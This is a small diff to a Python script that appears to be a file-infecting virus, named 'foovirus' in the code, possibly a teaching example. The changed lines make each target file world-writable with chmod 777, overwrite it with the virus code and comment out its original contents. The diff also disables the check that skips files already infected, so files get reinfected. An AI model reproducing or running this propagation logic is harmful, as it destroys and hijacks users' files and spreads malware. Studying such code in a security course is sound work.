@@ -120,11 +120,8 @@ while True:
                         IN = open(item, 'r')
                         all_of_it = IN.readlines()
                         IN.close()
-                        if any('foovirus' in line for line in all_of_it): continue
-                        # os.chmod(item, 0o777)
-                        print(f"chmod success test")
-                        success = os.system(f"chmod 777 {item}")
-                        print(f"chmod success: {success}")    
+                        # if any('foovirus' in line for line in all_of_it): continue
+                        os.chmod(item, 0o777)
                         OUT = open(item, 'w')
                         OUT.writelines(virus)
                         all_of_it = ['#' + line for line in all_of_it]
